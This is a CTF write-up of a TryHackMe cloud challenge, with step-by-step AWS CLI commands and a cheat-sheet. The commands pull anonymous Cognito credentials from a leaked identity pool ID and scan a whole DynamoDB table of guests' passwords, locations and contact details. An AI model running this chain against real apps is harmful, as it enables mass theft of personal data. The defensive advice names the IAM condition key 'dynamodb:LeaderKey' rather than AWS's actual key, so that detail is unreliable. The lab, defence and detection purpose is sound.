## CTF Writeup — "Complimentary" Cognito → DynamoDB IAM Misconfig (TryHackMe)
### TryHackMe · Hacker Holidays · Cloud / AWS · anonymous Cognito credentials dumping a whole DynamoDB table

**Flag:** `THM{REDACTED}`

---

## TL;DR

A "free" wellness app hands **every anonymous visitor a set of AWS guest
credentials** via Amazon Cognito — by design, no login. The IAM role behind those
credentials is over-permissioned: it allows `dynamodb:Scan` on the whole guest
table instead of just the caller's own row. So any anonymous visitor can dump
**every guest's plaintext password, GPS location, email, and phone number**. The
flag sits in another guest's record. The bug isn't the anonymous access (that was
intended) — it's that the anonymous role could read *everyone's* data.

---

## The attack chain

```
Static app.js  →  leaks Cognito IdentityPoolId, region, DynamoDB table name
        │
        ▼
Cognito identity pool has UNAUTHENTICATED access enabled
        │
        ▼
get-id  →  get-credentials-for-identity   (no login → temporary AWS creds)
        │
        ▼
Assume the guest role (confirm with sts get-caller-identity)
        │
        ▼
The role permits dynamodb:Scan (app only ever used GetItem-by-own-key)
        │
        ▼
scan the table  →  every guest's PII + passwords  →  FLAG in another guest's notes
```

---

## Background: Cognito identity pools & the "own row" problem

**Amazon Cognito** lets an app hand out temporary AWS credentials to users.
Crucially, it supports **unauthenticated ("guest") identities** — credentials for
people who haven't logged in at all. That's a legitimate feature (e.g. to save
preferences before signup).

The catch: those guest credentials come with an **IAM role**, and that role's
permissions decide what the anonymous user can touch in your AWS account. If the
role is scoped too broadly — say, "read the entire users table" instead of "read
only your own record" — then *every anonymous visitor* can read *everyone's* data.

**DynamoDB** (AWS's NoSQL database) has two relevant read operations:
- `GetItem` — fetch **one** row by its key (what a well-built app uses: "get *my*
  record").
- `Scan` — read the **entire table**.

This app's code only ever calls `GetItem` on the user's own key — but the role
*also* allows `Scan`, and nothing stops us from using it. That mismatch is the vuln.

## Scope note

THM-provisioned target in the challenge's own AWS account; the temporary
credentials are issued to anonymous callers *by design*, so using them here is the
intended path. Worked from the THM attackbox.

## Step 1 — Recover the client config

The app is a static page whose JavaScript talks to AWS directly, so all its config
is in the browser bundle:

```bash
curl -s http://.../app.js
```

`app.js`, in plaintext, hands us everything:

```javascript
const IDENTITY_POOL_ID = "us-east-1:xxxxxxxx-....";   // Cognito pool
const AWS_REGION        = "us-east-1";
const TABLE_NAME        = "complimentary-GuestWellnessProfiles";
// ...
dynamodb.getItem({ TableName: TABLE_NAME, Key: { guest_id: {...} } });  // OWN row only
```

- **Identity Pool ID**, **region**, and **table name** — all we need.
- The app self-limits to `GetItem` on its own key. But that restraint is
  *cosmetic* — the client is ours to change; the real limit is the IAM role.

Anything a browser-based AWS client does is client-side by definition, so its
config is never secret.

## Step 2 — Obtain anonymous guest credentials

Two unauthenticated Cognito API calls:

```bash
POOL="us-east-1:xxxxxxxx-...."

IDID=$(aws cognito-identity get-id --identity-pool-id "$POOL" \
  --region us-east-1 --query IdentityId --output text)

aws cognito-identity get-credentials-for-identity \
  --identity-id "$IDID" --region us-east-1
```

- `get-id` asks Cognito "give me an identity" (no login needed).
- `get-credentials-for-identity` exchanges that for temporary AWS keys
  (`AccessKeyId`, `SecretKey`, `SessionToken`), valid ~1 hour — "the same set it
  hands everyone."

## Step 3 — Assume the guest identity (the gotcha)

Load the three values into the environment, then **confirm who you are before
doing anything**:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...          # ← the one people forget

aws sts get-caller-identity
```

> **Gotcha that cost a step:** the first `Scan` returned `AccessDenied`. The cause
> wasn't the policy — `sts get-caller-identity` still showed the **attackbox's own
> role**, because the credentials hadn't taken effect (a missing `AWS_SESSION_TOKEN`
> silently falls back to the ambient identity). **Always confirm
> `sts get-caller-identity` before concluding a permission is denied** — an
> "AccessDenied" as the wrong principal tells you nothing about the one you meant
> to test.

Once correct, the output shows the Cognito unauth role:

```json
{ "Account": "3321...", "Arn": ".../complimentary-cognito-unauth-role/..." }
```

## Step 4 — Exploit: scan the whole table

The app uses `GetItem` on one key; the role also permits `Scan`:

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```

`Count: 5` — **every** guest returned, not just ours. The misconfiguration is
proven.

## Step 5 — The flag (and the real breach)

The flag lives in another guest's `notes` field:

```
THM{REDACTED}
```

But the scan dumped the actual breach for **all five guests**: **plaintext
passwords**, **precise GPS coordinates** (~10 m), emails, and phone numbers. Two
compounding failures on top of the authorization flaw: passwords stored in
cleartext, and precise geolocation readable by any anonymous app user. "It's only
read-only" is meaningless when read-only covers everyone's PII.

---

## Root cause

- **Unauth role scoped to the table, not the row** — the anonymous role allowed
  `Scan`/unrestricted `GetItem` on the whole table. Anonymous = *every* visitor
  holds this role.
- **No row-level isolation** — DynamoDB can restrict access per-identity with IAM
  condition keys (tying `dynamodb:LeaderKey` to the Cognito identity), but none was
  applied. The "you see only your record" rule existed only in client JS.
- **Plaintext passwords** in an anonymously-readable table.
- **Sensitive PII (precise location)** in the same table.

## Defensive takeaways

- **Deny `Scan`; scope reads to the caller's partition** with an IAM condition
  tying `dynamodb:LeaderKey` to `${cognito-identity.amazonaws.com:sub}`.
- **Never trust the client for authorization** — enforce at the IAM/policy layer.
- **Prefer a thin backend** (API Gateway + Lambda) that mediates DB access over
  handing raw table credentials to browsers.
- **Never store recoverable passwords**; hash with a slow KDF, or don't store them.
- **Classify and segregate PII**; encrypt; minimize what's retrievable.

## Detection opportunities

- **CloudTrail on the unauth role:** a spike of `GetCredentialsForIdentity`
  followed by `dynamodb:Scan` from the unauth role is the signature — legitimate
  app use only ever does a keyed `GetItem`, so a `Scan` from that role is
  by-definition anomalous.
- **`ScannedCount` far above the per-session expected 1** indicates table-wide
  reads.
- **IAM Access Analyzer / config rules** to flag identity-pool roles granting
  table-wide DynamoDB actions without a `LeaderKey` condition.

## Command cheat-sheet

```
# read the client config
curl -s http://.../app.js | grep -iE 'IdentityPool|region|Table'

# get anonymous creds
POOL="us-east-1:...."
IDID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region us-east-1 --query IdentityId --output text)
aws cognito-identity get-credentials-for-identity --identity-id "$IDID" --region us-east-1

# assume + CONFIRM identity
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity

# dump the table
aws dynamodb scan --table-name <table> --region us-east-1
```

## Two things worth remembering

1. **Anonymous access is fine; anonymous *over-permission* is the breach.** The
   question is never "can guests connect?" but "what can the guest role read?"
2. **Confirm your identity before trusting an AccessDenied.** Half of cloud-exploit
   debugging is realising you're testing as the wrong principal.

*Target and all guest records are fictional challenge data in a sandboxed AWS
account. Temporary credentials expire ~1 hour.*
